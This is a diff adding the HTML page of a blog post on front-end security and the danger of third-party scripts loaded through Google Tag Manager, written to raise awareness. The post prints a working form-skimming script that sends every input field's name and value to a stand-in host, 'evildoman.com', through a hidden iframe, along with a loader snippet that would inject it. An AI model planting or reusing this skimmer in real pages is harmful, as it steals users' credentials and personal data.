@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Front-End Security — Mads Stoumann</title>
+	<meta name="description" content="I recently read this blog-post by Yapni Berhanu, about the dangers of 3rd-party scripts &amp;mdash; something we include in tools like Google Tag Manager without blinking twice. This sentence in particula">
+	<link rel="canonical" href="https://blog.stoumann.dk/front-end-security">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="Front-End Security">
+	<meta property="og:description" content="I recently read this blog-post by Yapni Berhanu, about the dangers of 3rd-party scripts &amp;mdash; something we include in tools like Google Tag Manager without blinking twice. This sentence in particula">
+	<meta property="og:url" content="https://blog.stoumann.dk/front-end-security">
+	<meta property="og:image" content="https://blog.stoumann.dk/assets/generic_cover.jpg">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:title" content="Front-End Security">
+	<meta name="twitter:description" content="I recently read this blog-post by Yapni Berhanu, about the dangers of 3rd-party scripts &amp;mdash; something we include in tools like Google Tag Manager without blinking twice. This sentence in particula">
+	<meta name="twitter:image" content="https://blog.stoumann.dk/assets/generic_cover.jpg">
+	<base href="/">
+	<style>
+		body {
+			background: canvas;
+			color: canvastext;
+			color-scheme: light dark;
+			margin: 0;
+		}
+	</style>
+</head>
+<body>
+	<dev-to
+		author="madsstoumann"
+		baseurl="./data"
+		theme="classic"
+		itemsperpage="10">
+		<h1 slot="headline">Mads Stoumann's Blog</h1>
+		<p slot="description">Articles about CSS, JavaScript, and web development.</p>
+	</dev-to>
+	<noscript>
+		<article>
+			<h1>Front-End Security</h1>
+			<p>I recently read <a href="https://css-tricks.com/potential-dangers-of-third-party-javascript/" target="_blank">this blog-post</a> by Yapni Berhanu, about the dangers of 3rd-party scripts &mdash; something we include in tools like <em>Google Tag Manager</em> without blinking twice. This sentence in particular grabbed my attention:</p>
+<blockquote><p>Any time you include someone else&#8217;s external script on your page, there&#8217;s an inherent security risk because that script has full access to the front end of your site.</p></blockquote>
+<p>The potential security-problems might not be with your trusted vendors, but what if <em>they</em> get hacked, and inject malicious code?</p>
+<p>I&#8217;m not a hacker, so this might not be the most sophisticated example, but it&#8217;s an example of a script that:</p>
+<ol>
+<li>Adds an event-listener to all input-elements.</li>
+<li>When the user leaves an input-field, it creates an iframe with the input-fields&#8217; details added to the hash-fragment or querystring-part of the src of the iframe.</li>
+<li>After 250 milliseconds, the iframe is deleted, that should be sufficient time for the details to be grabbed and proccesed.</li>
+</ol>
+<pre class="brush: jscript; title: ; notranslate" title="">
+(function(url){
+	var d=document,i=d.querySelectorAll(&quot;input&quot;),l=location,n=i.length;
+	while(n--)i[n].addEventListener(&quot;blur&quot;,H,false);
+	function H(){
+		if (this.value){
+			var F=d.createElement(&quot;iframe&quot;),T;
+	  		F.width=0;F.height=0;F.src=l.protocol+&quot;//&quot;+url+l.host+&quot;?&quot;+this[&quot;name&quot;]+&quot;=&quot;+this.value;
+	    	d.body.appendChild(F);
+	    	T= window.setTimeout(function(){d.body.removeChild(F);},250);
+    	}
+	}
+})(&quot;evildoman.com/#&quot;);
+</pre>
+<p>You can include the script from an innocent-looking script in <em>Google Tag Manager</em>, this is, typically, what an external tracking-script implementation would look like in a <em>Custom HTML tag</em>:</p>
+<pre class="brush: jscript; title: ; notranslate" title="">
+&lt;script&gt;
+(function(d,s){
+	h=d.getElementsByTagName(&quot;head&quot;)[0];
+	o=d.createElement(&quot;script&quot;);
+	o.async=1;
+	o.src=s;
+	h.appendChild(r);
+})(document,&quot;//nicedomain.com/tracking.js&quot;);
+&lt;/script&gt;
+</pre>
+<p>&mdash; and <em>voila!</em>, the nice-domain-script loads the evil-domain-script, and all form fields on the page will create an iframe and post the field&#8217;s <em>value</em> and <em>name</em> in the <em>src</em> of the frame.</p>
+<p>I added a <em>snippet</em> in Dev Tools, and tried to trigger this code on Amazon and Facebook.<br />
+This is a &#8220;thought&#8221; example, since none of these would allow 3rd-party-scripts on their login-page, but I noticed a small difference:</p>
+<p>Facebook fired an XHR-post every time I leaved an input field &mdash; my guess is they&#8217;re using a <a href="https://developer.mozilla.org/en/docs/Web/API/MutationObserver" target="_blank">MutationObserver</a>, code that is called whenever something in the DOM changes, but can&#8217;t this be overwritten by a 3rd-party-script as well?</p>
+<p>And would it make sense to track all &#8220;outgoing&#8221; traffic by <a href="http://stackoverflow.com/questions/5202296/add-a-hook-to-all-ajax-requests-on-a-page" target="_blank">having an XHR Listener</a>?</p>
+<p>I don&#8217;t know, but should I? This leads to the next question:</p>
+<h2>Who has the front-end security responsibility?</h2>
+<ol>
+<li>Is it the front-end developer&#8217;s responsibility to safe-guard the JavaScript from (present and future) attacks?</li>
+<li>Is it the digital agency who&#8217;re adding 3rd-party-scripts from a tool like <em>Google Tag Manager?</em></li>
+<li>Is it the marketeer requesting a 3rd-party-script to be added?</li>
+</ol>
+<p>I would argue there&#8217;s enough on the front-end developers plate already (a new, hot, must-use framework coming out every week!), and since I predict there will not be <em>less</em> hacking attempts in the future, who really <em>has</em> the security responsibility here?</p>
+<p>Yapni Berhanu concludes his blog-post with this (excerpts):</p>
+<blockquote><p>Do you only allow sources you highly trust?<br />
+Do you vet the code yourself by reading it or watching DevTools closely?</p></blockquote>
+<p>&mdash; which suggest, it&#8217;s either the webmaster or the front-end developer&#8217;s responsibility.<br />
+I guess that is up for discussion, but until then, it might be a good idea to <em>remove</em> 3rd-party-scripts from pages, where users enter data.</p>
+<p>In <em>Google Tag Manager</em> one can add exception-triggers, so the 3rd-part-scripts are only loaded on the correct URL&#8217;s.</p>
+<p>But then: what about forms in overlays? They don&#8217;t have a unique URL for the exception-trigger.</p>
+<p>And then, <a href="https://www.hackthis.co.uk/articles/practical-applications-of-cross-site-scripting-xss" target="_blank">there&#8217;s XSS</a> &hellip;</p>
+
+		</article>
+	</noscript>
+	<script type="module">
+		import 'https://browser.style/ui/dev-to/index.js';
+	</script>
+</body>
+</html>
